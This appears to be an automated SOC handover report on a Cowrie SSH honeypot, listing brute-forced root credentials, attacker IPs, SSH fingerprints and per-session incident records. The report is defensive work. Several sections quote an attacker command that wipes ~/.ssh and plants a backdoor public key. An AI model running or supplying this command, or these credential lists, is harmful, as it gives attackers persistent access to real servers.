# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-24 |
| **Generated At** | 2026-04-24T18:59:48Z |
| **Shift Time** | 18:59 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **229** |
| Confirmed Threats | **225** |
| False Positives Filtered | **4** (1.8%) |
| Unique Attacker IPs | **17** |
| Countries of Origin | **9** |
| High Severity Cases | **88** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **141** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **196** |
| Unique Credential Pairs | **35** |
| Unique Usernames | **17** |
| Unique Passwords | **35** |
| Successful Auth Pairs | **53** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 88 |
| `345gs5662d34` | 43 |
| `admin` | 10 |
| `ali` | 8 |
| `user` | 7 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `3245gs5662d34` | 44 |
| `345gs5662d34` | 43 |
| `qazwsx123` | 5 |
| `Aa112211.` | 5 |
| `Qazwsx123#` | 5 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `root` | `3245gs5662d34` | 44 |
| `345gs5662d34` | `345gs5662d34` | 43 |
| `ubuntu` | `qazwsx123` | 5 |
| `root` | `Aa112211.` | 5 |
| `root` | `Qazwsx123#` | 5 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `Dd112211` | `115.93.19.12` | 2026-04-24T17:02:07 |
| `root` | `3245gs5662d34` | `115.93.19.12` | 2026-04-24T17:02:11 |
| `root` | `Aa112211.` | `115.93.19.12` | 2026-04-24T17:08:29 |
| `root` | `Qazwsx111111` | `171.244.141.86` | 2026-04-24T17:12:59 |
| `root` | `3245gs5662d34` | `171.244.141.86` | 2026-04-24T17:13:02 |
| `root` | `test2024` | `171.244.141.86` | 2026-04-24T17:14:08 |
| `root` | `Aa112211.` | `171.244.141.86` | 2026-04-24T17:15:15 |
| `root` | `sangfor@123` | `102.219.126.124` | 2026-04-24T17:15:51 |
| `root` | `3245gs5662d34` | `102.219.126.124` | 2026-04-24T17:15:58 |
| `root` | `AAA123aaa` | `171.244.141.86` | 2026-04-24T17:20:31 |
| `root` | `nPSpP4PBW0` | `103.78.1.33` | 2026-04-24T17:23:33 |
| `root` | `3245gs5662d34` | `103.78.1.33` | 2026-04-24T17:23:36 |
| `root` | `AAA123aaa` | `103.78.1.33` | 2026-04-24T17:26:36 |
| `root` | `root2026#$` | `171.244.141.86` | 2026-04-24T17:26:47 |
| `root` | `qazwsx888!!` | `103.78.1.33` | 2026-04-24T17:27:42 |
| `root` | `Root8888!@` | `103.82.37.34` | 2026-04-24T17:28:18 |
| `root` | `3245gs5662d34` | `103.82.37.34` | 2026-04-24T17:28:21 |
| `root` | `Qazwsx111111` | `14.248.83.33` | 2026-04-24T17:29:22 |
| `root` | `3245gs5662d34` | `14.248.83.33` | 2026-04-24T17:29:25 |
| `root` | `root2026#$` | `14.248.83.33` | 2026-04-24T17:30:20 |
| `root` | `qazwsx888!!` | `171.244.141.86` | 2026-04-24T17:31:07 |
| `root` | `Qazwsx123#` | `103.78.1.33` | 2026-04-24T17:31:53 |
| `root` | `Alibaba@123` | `14.248.83.33` | 2026-04-24T17:32:42 |
| `root` | `AAA123aaa` | `122.170.115.173` | 2026-04-24T17:32:58 |
| `root` | `3245gs5662d34` | `122.170.115.173` | 2026-04-24T17:33:04 |
| `root` | `Root21!` | `122.170.115.173` | 2026-04-24T17:34:57 |
| `root` | `Aa112211.` | `103.78.1.33` | 2026-04-24T17:35:07 |
| `root` | `Alibaba@123` | `171.244.141.86` | 2026-04-24T17:35:21 |
| `root` | `test2024` | `14.248.83.33` | 2026-04-24T17:35:38 |
| `root` | `Root21!` | `171.244.141.86` | 2026-04-24T17:36:22 |
| `root` | `Qazwsx123#` | `14.248.83.33` | 2026-04-24T17:36:37 |
| `root` | `Aa112211.` | `122.170.115.173` | 2026-04-24T17:37:51 |
| `root` | `Qazwsx123#` | `171.244.141.86` | 2026-04-24T17:38:27 |
| `root` | `qazwsx888!!` | `14.248.83.33` | 2026-04-24T17:39:18 |
| `root` | `Qazwsx111111` | `122.170.115.173` | 2026-04-24T17:39:31 |
| `root` | `nPSpP4PBW0` | `171.244.141.86` | 2026-04-24T17:39:33 |
| `root` | `Alibaba@123` | `103.78.1.33` | 2026-04-24T17:42:24 |
| `root` | `Qazwsx111111` | `103.78.1.33` | 2026-04-24T17:43:31 |
| `root` | `Root21!` | `14.248.83.33` | 2026-04-24T17:45:08 |
| `root` | `test2024` | `103.78.1.33` | 2026-04-24T17:45:33 |
| `root` | `Root21!` | `103.78.1.33` | 2026-04-24T17:46:39 |
| `root` | `amit@123` | `43.130.57.128` | 2026-04-24T17:46:43 |
| `root` | `3245gs5662d34` | `43.130.57.128` | 2026-04-24T17:46:49 |
| `root` | `AAA123aaa` | `14.248.83.33` | 2026-04-24T17:47:10 |
| `root` | `root2026#$` | `103.78.1.33` | 2026-04-24T17:47:43 |
| `root` | `nPSpP4PBW0` | `14.248.83.33` | 2026-04-24T17:48:34 |
| `root` | `Aa112211.` | `14.248.83.33` | 2026-04-24T17:49:33 |
| `root` | `root2026#$` | `122.170.115.173` | 2026-04-24T17:54:27 |
| `root` | `test2024` | `122.170.115.173` | 2026-04-24T17:58:56 |
| `root` | `nPSpP4PBW0` | `122.170.115.173` | 2026-04-24T18:04:16 |
| `root` | `Qazwsx123#` | `122.170.115.173` | 2026-04-24T18:10:14 |
| `root` | `Qazwsx123#` | `44.32.81.28` | 2026-04-24T18:21:34 |
| `root` | `3245gs5662d34` | `44.32.81.28` | 2026-04-24T18:21:44 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **229** |
| Sessions with Fingerprint | **3** |
| Unique HASSH Fingerprints | **3** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 198 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `af8223ac9914...` | libssh-based | 188 | 9 |
| `03a80b21afa8...` | Modern SSH client | 9 | 2 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `af8223ac9914...` | libssh | 188 | 9 | libssh-based |
| `03a80b21afa8...` | libssh | 9 | 2 | Modern SSH client |
| `95420f9d932d...` | libssh | 1 | 1 | — |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 44 | 9 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `14.248.83.33`, `103.82.37.34`, `44.32.81.28`, `103.78.1.33`, `43.130.57.128`, `122.170.115.173`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **17** |
| Unique ASNs | **17** |
| High-Risk ASNs | **14** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS149766` | Y.U.T Corporate Company Limited | 1 | HIGH |
| `AS135951` | Webico Company Limited | 1 | HIGH |
| `AS24560` | Bharti Airtel Ltd., Telemedia Services | 1 | HIGH |
| `AS140810` | Megacore Technology Company Limited | 1 | HIGH |
| `AS135905` | VIETNAM POSTS AND TELECOMMUNICATIONS GROUP | 1 | HIGH |
| `AS7552` | Viettel Group | 1 | HIGH |
| `AS138423` | CMPak Limited | 1 | HIGH |
| `AS14618` | Amazon.com, Inc. | 1 | MEDIUM |

---

---

## 🚨 Priority Cases — Immediate Attention (88)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-a82df2b1aae7

| Field | Detail |
|---|---|
| **Source IP** | `115.93.19[.]12` |
| **First Seen** | 2026-04-24 17:02 |
| **Last Seen** | 2026-04-24 17:02 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 17:02:07` | `cowrie.session.connect` |
| `2026-04-24 17:02:07` | `cowrie.client.version` |
| `2026-04-24 17:02:07` | `cowrie.client.kex` |
| `2026-04-24 17:02:07` | `cowrie.login.success` |
| `2026-04-24 17:02:08` | `cowrie.session.params` |
| `2026-04-24 17:02:08` | `cowrie.command.input` |
| `2026-04-24 17:02:08` | `cowrie.command.failed` |
| `2026-04-24 17:02:08` | `cowrie.log.closed` |
| `2026-04-24 17:02:08` | `cowrie.session.params` |
| `2026-04-24 17:02:08` | `cowrie.command.input` |
| `2026-04-24 17:02:08` | `cowrie.session.file_download` |
| `2026-04-24 17:02:08` | `cowrie.log.closed` |
| `2026-04-24 17:02:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.93.19[.]12` to AbuseIPDB if not already reported
- [ ] Block `115.93.19[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b080fc2875ee

| Field | Detail |
|---|---|
| **Source IP** | `115.93.19[.]12` |
| **First Seen** | 2026-04-24 17:02 |
| **Last Seen** | 2026-04-24 17:02 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 17:02:11` | `cowrie.session.connect` |
| `2026-04-24 17:02:11` | `cowrie.client.version` |
| `2026-04-24 17:02:11` | `cowrie.client.kex` |
| `2026-04-24 17:02:11` | `cowrie.login.success` |
| `2026-04-24 17:02:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.93.19[.]12` to AbuseIPDB if not already reported
- [ ] Block `115.93.19[.]12` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e96af072721d

| Field | Detail |
|---|---|
| **Source IP** | `115.93.19[.]12` |
| **First Seen** | 2026-04-24 17:08 |
| **Last Seen** | 2026-04-24 17:08 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 17:08:28` | `cowrie.session.connect` |
| `2026-04-24 17:08:28` | `cowrie.client.version` |
| `2026-04-24 17:08:28` | `cowrie.client.kex` |
| `2026-04-24 17:08:29` | `cowrie.login.success` |
| `2026-04-24 17:08:29` | `cowrie.session.params` |
| `2026-04-24 17:08:29` | `cowrie.command.input` |
| `2026-04-24 17:08:29` | `cowrie.command.failed` |
| `2026-04-24 17:08:29` | `cowrie.log.closed` |
| `2026-04-24 17:08:30` | `cowrie.session.params` |
| `2026-04-24 17:08:30` | `cowrie.command.input` |
| `2026-04-24 17:08:30` | `cowrie.session.file_download` |
| `2026-04-24 17:08:30` | `cowrie.log.closed` |
| `2026-04-24 17:08:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.93.19[.]12` to AbuseIPDB if not already reported
- [ ] Block `115.93.19[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-947a6949d29f

| Field | Detail |
|---|---|
| **Source IP** | `115.93.19[.]12` |
| **First Seen** | 2026-04-24 17:08 |
| **Last Seen** | 2026-04-24 17:08 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 17:08:32` | `cowrie.session.connect` |
| `2026-04-24 17:08:32` | `cowrie.client.version` |
| `2026-04-24 17:08:32` | `cowrie.client.kex` |
| `2026-04-24 17:08:33` | `cowrie.login.success` |
| `2026-04-24 17:08:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.93.19[.]12` to AbuseIPDB if not already reported
- [ ] Block `115.93.19[.]12` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8efa4e2ea252

| Field | Detail |
|---|---|
| **Source IP** | `171.244.141[.]86` |
| **First Seen** | 2026-04-24 17:12 |
| **Last Seen** | 2026-04-24 17:13 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 17:12:59` | `cowrie.session.connect` |
| `2026-04-24 17:12:59` | `cowrie.client.version` |
| `2026-04-24 17:12:59` | `cowrie.client.kex` |
| `2026-04-24 17:12:59` | `cowrie.login.success` |
| `2026-04-24 17:13:00` | `cowrie.session.params` |
| `2026-04-24 17:13:00` | `cowrie.command.input` |
| `2026-04-24 17:13:00` | `cowrie.command.failed` |
| `2026-04-24 17:13:00` | `cowrie.log.closed` |
| `2026-04-24 17:13:00` | `cowrie.session.params` |
| `2026-04-24 17:13:00` | `cowrie.command.input` |
| `2026-04-24 17:13:00` | `cowrie.session.file_download` |
| `2026-04-24 17:13:00` | `cowrie.log.closed` |
| `2026-04-24 17:13:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.244.141[.]86` to AbuseIPDB if not already reported
- [ ] Block `171.244.141[.]86` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5bbcb780ab83

| Field | Detail |
|---|---|
| **Source IP** | `171.244.141[.]86` |
| **First Seen** | 2026-04-24 17:13 |
| **Last Seen** | 2026-04-24 17:13 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 17:13:02` | `cowrie.session.connect` |
| `2026-04-24 17:13:02` | `cowrie.client.version` |
| `2026-04-24 17:13:02` | `cowrie.client.kex` |
| `2026-04-24 17:13:02` | `cowrie.login.success` |
| `2026-04-24 17:13:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.244.141[.]86` to AbuseIPDB if not already reported
- [ ] Block `171.244.141[.]86` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-02a81227750c

| Field | Detail |
|---|---|
| **Source IP** | `171.244.141[.]86` |
| **First Seen** | 2026-04-24 17:14 |
| **Last Seen** | 2026-04-24 17:14 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 17:14:08` | `cowrie.session.connect` |
| `2026-04-24 17:14:08` | `cowrie.client.version` |
| `2026-04-24 17:14:08` | `cowrie.client.kex` |
| `2026-04-24 17:14:08` | `cowrie.login.success` |
| `2026-04-24 17:14:08` | `cowrie.session.params` |
| `2026-04-24 17:14:08` | `cowrie.command.input` |
| `2026-04-24 17:14:08` | `cowrie.command.failed` |
| `2026-04-24 17:14:08` | `cowrie.log.closed` |
| `2026-04-24 17:14:09` | `cowrie.session.params` |
| `2026-04-24 17:14:09` | `cowrie.command.input` |
| `2026-04-24 17:14:09` | `cowrie.session.file_download` |
| `2026-04-24 17:14:09` | `cowrie.log.closed` |
| `2026-04-24 17:14:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.244.141[.]86` to AbuseIPDB if not already reported
- [ ] Block `171.244.141[.]86` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c03f4be8b74b

| Field | Detail |
|---|---|
| **Source IP** | `171.244.141[.]86` |
| **First Seen** | 2026-04-24 17:14 |
| **Last Seen** | 2026-04-24 17:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 17:14:10` | `cowrie.session.connect` |
| `2026-04-24 17:14:10` | `cowrie.client.version` |
| `2026-04-24 17:14:11` | `cowrie.client.kex` |
| `2026-04-24 17:14:11` | `cowrie.login.success` |
| `2026-04-24 17:14:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.244.141[.]86` to AbuseIPDB if not already reported
- [ ] Block `171.244.141[.]86` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3ea5305bb1be

| Field | Detail |
|---|---|
| **Source IP** | `171.244.141[.]86` |
| **First Seen** | 2026-04-24 17:15 |
| **Last Seen** | 2026-04-24 17:15 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 17:15:14` | `cowrie.session.connect` |
| `2026-04-24 17:15:14` | `cowrie.client.version` |
| `2026-04-24 17:15:14` | `cowrie.client.kex` |
| `2026-04-24 17:15:15` | `cowrie.login.success` |
| `2026-04-24 17:15:15` | `cowrie.session.params` |
| `2026-04-24 17:15:15` | `cowrie.command.input` |
| `2026-04-24 17:15:15` | `cowrie.command.failed` |
| `2026-04-24 17:15:15` | `cowrie.log.closed` |
| `2026-04-24 17:15:15` | `cowrie.session.params` |
| `2026-04-24 17:15:15` | `cowrie.command.input` |
| `2026-04-24 17:15:15` | `cowrie.session.file_download` |
| `2026-04-24 17:15:15` | `cowrie.log.closed` |
| `2026-04-24 17:15:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.244.141[.]86` to AbuseIPDB if not already reported
- [ ] Block `171.244.141[.]86` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b9b3a0266f11

| Field | Detail |
|---|---|
| **Source IP** | `171.244.141[.]86` |
| **First Seen** | 2026-04-24 17:15 |
| **Last Seen** | 2026-04-24 17:15 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 17:15:17` | `cowrie.session.connect` |
| `2026-04-24 17:15:17` | `cowrie.client.version` |
| `2026-04-24 17:15:17` | `cowrie.client.kex` |
| `2026-04-24 17:15:17` | `cowrie.login.success` |
| `2026-04-24 17:15:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.244.141[.]86` to AbuseIPDB if not already reported
- [ ] Block `171.244.141[.]86` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-75924006ddbb

| Field | Detail |
|---|---|
| **Source IP** | `102.219.126[.]124` |
| **First Seen** | 2026-04-24 17:15 |
| **Last Seen** | 2026-04-24 17:15 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 17:15:49` | `cowrie.session.connect` |
| `2026-04-24 17:15:50` | `cowrie.client.version` |
| `2026-04-24 17:15:50` | `cowrie.client.kex` |
| `2026-04-24 17:15:51` | `cowrie.login.success` |
| `2026-04-24 17:15:52` | `cowrie.session.params` |
| `2026-04-24 17:15:52` | `cowrie.command.input` |
| `2026-04-24 17:15:52` | `cowrie.command.failed` |
| `2026-04-24 17:15:52` | `cowrie.log.closed` |
| `2026-04-24 17:15:53` | `cowrie.session.params` |
| `2026-04-24 17:15:53` | `cowrie.command.input` |
| `2026-04-24 17:15:53` | `cowrie.session.file_download` |
| `2026-04-24 17:15:53` | `cowrie.log.closed` |
| `2026-04-24 17:15:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.219.126[.]124` to AbuseIPDB if not already reported
- [ ] Block `102.219.126[.]124` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c9328c0da07

| Field | Detail |
|---|---|
| **Source IP** | `102.219.126[.]124` |
| **First Seen** | 2026-04-24 17:15 |
| **Last Seen** | 2026-04-24 17:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
